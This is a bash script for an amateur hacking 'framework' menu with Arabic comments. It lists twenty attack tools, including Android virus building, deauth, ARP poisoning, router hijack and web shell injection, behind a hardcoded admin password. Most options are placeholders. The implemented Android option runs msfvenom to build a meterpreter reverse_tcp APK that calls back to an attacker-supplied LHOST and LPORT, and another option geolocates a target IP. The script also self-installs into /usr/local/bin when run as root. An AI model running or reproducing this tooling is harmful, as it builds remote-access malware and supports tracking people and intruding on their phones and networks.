#!/bin/bash
# xxszmsx FRAMEWORK v3.0 | BY: STUDIO
# [!] THE MASTER CONTROL PANEL - MAZEN EDITION
RED='\e[1;31m'; GREEN='\e[1;32m'; NC='\e[0m'

# --- [ نظام الحماية الاحترافي ] ---
function admin_login() {
    clear
    echo -e "${RED}-----------------------------------------------------"
    echo -e "[!] STUDIO SECURITY SYSTEM | LOGIN REQUIRED"
    echo -e "-----------------------------------------------------${NC}"
    read -s -p "[?] Enter Admin Password: " pass
    echo ""
    if [ "$pass" == "mazen2014" ]; then
        echo -e "${GREEN}[+] Access Granted! Welcome Master Mazen.${NC}"
        sleep 1
    else
        echo -e "${RED}[X] Access Denied! WRONG PASSWORD.${NC}"
        exit 1
    fi
}

# --- [ لوحة تعديل الملفات والأكواد ] ---
function admin_editor() {
    clear
    echo -e "${RED}-----------------------------------------------------"
    echo -e "   STUDIO ADMIN PANEL - FILE MANAGER & UPDATER"
    echo -e "-----------------------------------------------------${NC}"
    echo "1) Edit xxszmsx.sh (Main Code)"
    echo "2) Add/Create New Tool File"
    echo "3) Change Admin Password"
    echo "4) Force Pull from GitHub"
    echo "5) List All Files in Tool"
    echo "6) Back to Home"
    read -p "Admin Choice >> " ed_choice

    case $ed_choice in
        1) nano xxszmsx.sh ;;
        2) read -p "Enter New File Name (ex: virus.py): " n_file; nano $n_file ;;
        3) echo -e "${RED}[!] To change password, find 'mazen2014' in the code and edit it.${NC}"; sleep 2; nano xxszmsx.sh ;;
        4) git pull origin main ;;
        5) ls -la; read -p "Press Enter..." ;;
        *) return ;;
    esac
}

# --- [ التثبيت التلقائي ] ---
if [[ $EUID -eq 0 ]] && [ ! -f "/usr/local/bin/studio" ]; then
    ln -sf "$(pwd)/xxszmsx.sh" /usr/local/bin/studio
    chmod +x /usr/local/bin/studio
fi

admin_login # تسجيل الدخول الإلزامي

# --- [ القائمة الرئيسية ] ---
while true; do
    clear
    echo -e "${RED}"
    echo "██╗  ██╗██╗  ██╗███████╗███████╗███    ███╗██╗  ██╗"
    echo "╚██╗██╔╝╚██╗██╔╝██╔════╝██╔════╝████  ████║╚██╗██╔╝"
    echo " ╚███╔╝  ╚███╔╝ ███████╗███████╗██╔████╔██║ ╚███╔╝ "
    echo " ██╔██╗  ██╔██╗ ╚════██║╚════██║██║╚██╔╝██║ ██╔██╗ "
    echo "██╔╝ ██╗██╔╝ ██╗███████║███████║██║ ╚═╝ ██║██╔╝ ██╗"
    echo -e "╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝${NC}"
    echo "-----------------------------------------------------"
    echo "   [!] 20 PRO TOOLS | BY: STUDIO | MASTER MODE       "
    echo "-----------------------------------------------------"
    echo -e "1) Android Virus Build     11) ADMIN CONTROL PANEL"
    echo "2) Precise IP Tracker      12) Spoof Fake Call"
    echo "3) WiFi Monitor Mode       13) Phone OSINT"
    echo "4) Deauth Attack           14) DNS Spoofing"
    echo "5) MAC Randomizer          15) Social Search"
    echo "6) Port Scanner            16) Web Shell Inject"
    echo "7) Arp Poisoning           17) Email Leak Scan"
    echo "8) Router Hijack           18) Brute Force Pass"
    echo "9) Packet Injector         19) Hash Decryptor"
    echo "10) Bettercap UI           20) SYNC & CLEAN"
    echo "-----------------------------------------------------"
    echo "0) Exit"
    read -p "xxszmsx >> " choice

    case $choice in
        1) read -p "LHOST: " lh; read -p "LPORT: " lp; msfvenom -p android/meterpreter/reverse_tcp LHOST=$lh LPORT=$lp R > mazen.apk ;;
        2) read -p "IP: " tip; curl -s "http://ip-api.com/json/$tip?fields=status,country,regionName,city,zip,lat,lon,isp,query" ;;
        11) admin_editor ;;
        12) echo -e "${RED}[!] Calling Simulation Started...${NC}"; sleep 1 ;;
        20) git pull origin main; echo -e "${GREEN}[+] Updated!${NC}" ;;
        0) exit 0 ;;
    esac
    echo -e "\n${RED}[+] Press Enter to Continue...${NC}"
    read
done
